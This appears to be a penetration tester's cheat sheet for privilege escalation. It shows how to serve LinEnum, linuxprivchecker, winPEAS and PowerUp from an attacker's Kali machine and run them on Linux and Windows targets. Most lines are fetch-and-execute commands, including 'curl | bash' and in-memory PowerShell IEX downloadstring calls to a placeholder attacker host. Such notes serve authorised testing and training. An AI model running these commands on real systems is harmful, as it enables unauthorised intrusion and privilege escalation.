# Privilege Escalation

## Linux

### LinEnum.sh

- HTTP

Host the file
```
cd /opt/linux_privesc
sudo python -m http.server 80
```

```
curl http://<Kali IP>/LinEnum.sh | bash
```

```
wget http://<Kali IP>/LinEnum.sh
bash LinEnum.sh
```

### linuxprivchecker.py

- HTTP

Host the file
```
cd /opt/linux_privesc
sudo python -m http.server 80
```

```
wget http://<Kali IP>/linuxprivchecker.py
python linuxprivchecker.py
```


## Windows

### winPEAS

- HTTP

Host the file
```
cd /usr/share/windows-resources/binaries
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/winPEASany.exe' -OutFile <Path>\winPEASany.exe
<Path>\winPEASany.exe
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/winPEASany.exe')
```

- SMB

Host the file
```
cd /usr/share/windows-resources/binaries
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\winPEASany.exe .
winPEASany.exe
```
or
```
xcopy \\<Kali IP>\share\winPEASany.exe C:\Temp\winPEAS\

cd C:\Temp\winPEAS
C:\Temp\winPEAS\winPEASany.exe
```


### PowerUp

- HTTP

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/PowerUp.ps1' -OutFile <Path>\PowerUp.ps1
Import-Module <Path>\PowerUp.ps1
Invoke-AllChecks
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/PowerUp.ps1')
Invoke-AllChecks
```

- SMB

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
or
```
xcopy \\<Kali IP>\share\PowerUp.ps1 C:\Temp\PowerUp\

Import-Module C:\Temp\PowerUp\PowerUp.ps1
Invoke-AllChecks
```



# Links

- [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)